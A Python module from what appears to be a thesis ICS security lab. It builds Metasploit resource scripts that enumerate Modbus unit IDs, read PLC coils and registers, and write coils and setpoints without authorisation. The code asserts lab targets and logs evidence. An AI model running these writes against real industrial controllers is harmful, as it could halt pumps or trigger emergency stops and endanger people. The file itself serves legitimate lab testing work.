#!/usr/bin/env python3
"""Ataques Modbus TCP vía Metasploit (auxiliary/scanner/scada/*).

Para cada acción se escribe un resource script `.rc` y se lanza con
`msfconsole -q -r <script.rc>`.
"""

import os
import re

import config
from core import runner, evidence


def _write_rc(nombre, lineas):
    """Escribe un resource script .rc y devuelve su ruta."""
    path = os.path.join(config.RESOURCE_SCRIPTS_DIR, nombre)
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lineas) + "\n")
    return path


def _run_rc(rc_path, evidence_path, sink):
    # wrap_live fuerza line-buffering para que veamos la salida en vivo
    # (msfconsole bufferiza stdout cuando el padre no es TTY). wrap_proxy
    # añade proxychains si el modo es "empresa".
    return runner.run_command(
        runner.wrap_proxy(runner.wrap_live(["msfconsole", "-q", "-r", rc_path])),
        evidence_path, sink=sink, timeout=900)


def findunitid(target=None, port=None, unit_first=1, unit_last=5, sink=None):
    """auxiliary/scanner/scada/modbus_findunitid.

    Por defecto itera 1-5 (los PLCs del laboratorio usan 1,2,3). El módulo msf
    original barre 1-255, lo que por el túnel SOCKS resulta inviable. Se puede
    ampliar desde el dashboard para la memoria del TFM.
    """
    target = runner.assert_lab_target(target or config.MODBUS_DEFAULT_TARGET)
    port = port or config.MODBUS_DEFAULT_PORT
    path = evidence.new_evidence_file("modbus", "findunitid")
    evidence.header(path, "Modbus - Enumeración de Unit/Station ID",
                    f"{target}:{port} (unit_id {unit_first}-{unit_last})",
                    config.MITRE_MAP["modbus.findunitid"])
    rc = _write_rc("modbus_findunitid.rc", [
        "use auxiliary/scanner/scada/modbus_findunitid",
        f"set RHOSTS {target}",
        f"set RPORT {port}",
        f"set UNIT_ID_FROM {unit_first}",
        f"set UNIT_ID_TO {unit_last}",
        "run",
        "exit",
    ])
    _run_rc(rc, path, sink)
    return path


def detect(target=None, port=None, sink=None):
    """auxiliary/scanner/scada/modbusdetect."""
    target = runner.assert_lab_target(target or config.MODBUS_DEFAULT_TARGET)
    port = port or config.MODBUS_DEFAULT_PORT
    path = evidence.new_evidence_file("modbus", "detect")
    evidence.header(path, "Modbus - Detección de servicio",
                    f"{target}:{port}", config.MITRE_MAP["modbus.detect"])
    rc = _write_rc("modbusdetect.rc", [
        "use auxiliary/scanner/scada/modbusdetect",
        f"set RHOSTS {target}",
        f"set RPORT {port}",
        "set THREADS 10",
        "run",
        "exit",
    ])
    _run_rc(rc, path, sink)
    return path


def _modbusclient(action, target, port, data_address, number=None,
                  data=None, unit_id=1, label="", mitre_key="", sink=None):
    target = runner.assert_lab_target(target or config.MODBUS_DEFAULT_TARGET)
    port = port or config.MODBUS_DEFAULT_PORT
    path = evidence.new_evidence_file("modbus", action.lower())
    evidence.header(path, f"Modbus - {label}",
                    f"{target}:{port} (addr={data_address})",
                    config.MITRE_MAP.get(mitre_key, []))
    lineas = [
        "use auxiliary/scanner/scada/modbusclient",
        f"set RHOSTS {target}",
        f"set RPORT {port}",
        f"set UNIT_NUMBER {unit_id}",
        f"set ACTION {action}",
        f"set DATA_ADDRESS {data_address}",
    ]
    if number is not None:
        lineas.append(f"set NUMBER {number}")
    if data is not None:
        lineas.append(f"set DATA {data}")
    lineas += ["run", "exit"]
    rc = _write_rc(f"modbusclient_{action.lower()}.rc", lineas)
    _run_rc(rc, path, sink)
    return path


def read_coils(target=None, port=None, data_address=0, number=2, unit_id=1, sink=None):
    """READ_COILS: lee N coils desde data_address (ej. parada emergencia / marcha bomba)."""
    return _modbusclient(
        "READ_COILS", target, port, data_address, number=number, unit_id=unit_id,
        label="Lectura de Coils (READ_COILS)", mitre_key="modbus.read_coils", sink=sink)


def read_registers(target=None, port=None, data_address=0, number=20, unit_id=1, sink=None):
    """READ_REGISTERS: lee N holding registers desde data_address."""
    return _modbusclient(
        "READ_REGISTERS", target, port, data_address, number=number, unit_id=unit_id,
        label="Lectura de Holding Registers (READ_REGISTERS)",
        mitre_key="modbus.read_registers", sink=sink)


def write_coil(target=None, port=None, data_address=0, data=1, unit_id=1, sink=None):
    """WRITE_COIL: escribe un coil (0/1), p.ej. activar parada de emergencia o parar bomba."""
    return _modbusclient(
        "WRITE_COIL", target, port, data_address, data=data, unit_id=unit_id,
        label="Escritura de Coil (WRITE_COIL) - Comando no autorizado",
        mitre_key="modbus.write_coil", sink=sink)


def write_register(target=None, port=None, data_address=0, data=0, unit_id=1, sink=None):
    """WRITE_REGISTER: escribe un holding register (p.ej. consigna / setpoint)."""
    return _modbusclient(
        "WRITE_REGISTER", target, port, data_address, data=data, unit_id=unit_id,
        label="Escritura de Registro (WRITE_REGISTER) - Modify Parameter",
        mitre_key="modbus.write_register", sink=sink)


# ---------------------------------------------------------------------------
# Comparativa findunitid vs modbusclient
# ---------------------------------------------------------------------------
# modbus_findunitid de MSF solo valida los 4 primeros bytes del MBAP (trans_id
# + proto_id). Una excepcion Modbus 0x0B conserva esa cabecera, asi que el
# modulo marca "correct" tambien cuando el PLC esta rechazando el UID (p.ej.
# por la ACL del parche uid_acl.patch). modbusclient si interpreta FC + exc,
# devolviendo "Unknown error". Esta funcion lanza las dos pruebas en una unica
# sesion de msfconsole y anade un VEREDICTO parseado al final del fichero de
# evidencia, enlazado por el dashboard.
# ---------------------------------------------------------------------------

_FINDUNITID_RE  = re.compile(r"correct MODBUS/TCP from stationID\s+(\d+)")
_UNIT_SET_RE    = re.compile(r"UNIT_NUMBER\s*=>\s*(\d+)")
# msfconsole imprime la lectura exitosa en DOS lineas separadas:
#   [+] <ip>:502 - 5 register values from address 0 :
#   [+] <ip>:502 - [89, 30, 22, 8, 53]
_READ_INTRO_RE  = re.compile(r"\d+\s+register values from address")
# Lista de registros devueltos por msfconsole. Debe empezar por digito para no
# atrapar el prefijo "[+]" / "[*]" con que msfconsole decora sus propias lineas.
_READ_VALUES_RE = re.compile(r"\[(\s*\d[\d,\s-]*)\]")
_UNKNOWN_ERR_RE = re.compile(r"Unknown error", re.IGNORECASE)


def _parse_contrast(path, uids):
    """Lee el fichero de evidencia y resume el resultado de ambas fases."""
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        lines = f.readlines()

    findunitid_ok = set()
    for ln in lines:
        m = _FINDUNITID_RE.search(ln)
        if m:
            findunitid_ok.add(int(m.group(1)))

    results = {uid: {"status": "n/a", "valores": None} for uid in uids}
    uid_actual = None
    # estado: "wait_run" (acabamos de ver UNIT_NUMBER=>, esperamos resultado) /
    # "wait_values" (vimos la intro OK, esperamos la linea con [valores]) /
    # None (ya tenemos resultado estable para este UID).
    state = None
    for ln in lines:
        # Un nuevo UNIT_NUMBER cierra el estado del UID anterior aunque
        # estuvieramos esperando valores.
        m = _UNIT_SET_RE.search(ln)
        if m:
            uid_actual = int(m.group(1))
            state = "wait_run"
            continue
        if uid_actual is None or state is None:
            continue
        if state == "wait_run":
            if _READ_INTRO_RE.search(ln):
                results[uid_actual] = {"status": "ok", "valores": None}
                m2 = _READ_VALUES_RE.search(ln)
                if m2:
                    results[uid_actual]["valores"] = m2.group(1).strip()
                    state = None
                else:
                    state = "wait_values"
            elif _UNKNOWN_ERR_RE.search(ln):
                results[uid_actual] = {"status": "exc", "valores": None}
                state = None
        elif state == "wait_values":
            m2 = _READ_VALUES_RE.search(ln)
            if m2:
                results[uid_actual]["valores"] = m2.group(1).strip()
                state = None
    return findunitid_ok, results


def _write_veredicto(path, uids, sink=None):
    findunitid_ok, results = _parse_contrast(path, uids)

    sep = "=" * 70
    runner.log("", path, sink)
    runner.log(sep, path, sink)
    runner.log("  VEREDICTO (parseo automatico de la salida de msfconsole)", path, sink)
    runner.log(sep, path, sink)
    cab = f"{'UID':>4}  {'findunitid':<16}  {'modbusclient':<34}  valido?"
    runner.log(cab, path, sink)
    runner.log("-" * len(cab), path, sink)

    falsos_positivos = 0
    for uid in uids:
        fu = "correct" if uid in findunitid_ok else "no respondido"
        res = results[uid]
        if res["status"] == "ok":
            vals = res["valores"] or ""
            mc = f"OK, valores=[{vals}]"
            if len(mc) > 32:
                mc = mc[:29] + "..."
            valido = "SI"
        elif res["status"] == "exc":
            mc = "Unknown error (excepcion 0x0B)"
            valido = "NO"
        else:
            mc = "sin ejecutar"
            valido = "?"
        if fu == "correct" and valido == "NO":
            falsos_positivos += 1
            valido = "NO (falso positivo findunitid)"
        runner.log(f"{uid:>4}  {fu:<16}  {mc:<34}  {valido}", path, sink)

    runner.log("", path, sink)
    runner.log(
        f"Falsos positivos del findunitid: {falsos_positivos} de {len(uids)}",
        path, sink)
    runner.log("", path, sink)
    runner.log(
        "Explicacion: modbus_findunitid de MSF solo valida la cabecera MBAP",
        path, sink)
    runner.log(
        "(bytes 0..3, transaction + protocol id). La excepcion Modbus 0x0B",
        path, sink)
    runner.log(
        "conserva esa cabecera, por eso aparece como 'correct'. modbusclient",
        path, sink)
    runner.log(
        "interpreta la respuesta completa (FC | 0x80, exc_code) y si detecta",
        path, sink)
    runner.log("la excepcion devuelta por la ACL del PLC.", path, sink)
    runner.log(sep, path, sink)


def uid_contrast(target=None, port=None, unit_first=1, unit_last=5,
                 data_address=0, number=5, sink=None):
    """Lanza findunitid + modbusclient READ_REGISTERS iterando por UID y
    anade un VEREDICTO parseado al final del fichero de evidencia."""
    target = runner.assert_lab_target(target or config.MODBUS_DEFAULT_TARGET)
    port = port or config.MODBUS_DEFAULT_PORT
    unit_first = int(unit_first)
    unit_last = int(unit_last)
    if unit_last < unit_first:
        unit_last = unit_first
    uids = list(range(unit_first, unit_last + 1))

    path = evidence.new_evidence_file("modbus", "uid_contrast")
    evidence.header(
        path,
        "Modbus - Comparativa UID: findunitid vs modbusclient",
        f"{target}:{port} UID {unit_first}-{unit_last} (RHR addr={data_address}, N={number})",
        config.MITRE_MAP["modbus.uid_contrast"])

    runner.log(
        "[*] FASE 1 - modbus_findunitid (solo valida cabecera MBAP, "
        "tiende a dar falsos positivos ante ACL con excepcion 0x0B)",
        path, sink)

    lineas = [
        "use auxiliary/scanner/scada/modbus_findunitid",
        f"set RHOSTS {target}",
        f"set RPORT {port}",
        f"set UNIT_ID_FROM {unit_first}",
        f"set UNIT_ID_TO {unit_last}",
        "run",
        "",
        "use auxiliary/scanner/scada/modbusclient",
        f"set RHOSTS {target}",
        f"set RPORT {port}",
        "set ACTION READ_REGISTERS",
        f"set DATA_ADDRESS {data_address}",
        f"set NUMBER {number}",
    ]
    # Separador por UID: evitamos '()' en el echo porque msfconsole delega el
    # echo al shell y los parentesis provocan 'Syntax error'.
    for uid in uids:
        lineas += [
            f"echo === FASE 2 modbusclient UID={uid} ===",
            f"set UNIT_NUMBER {uid}",
            "run",
        ]
    lineas += ["exit"]

    rc = _write_rc("modbus_uid_contrast.rc", lineas)
    _run_rc(rc, path, sink)

    _write_veredicto(path, uids, sink)
    return path
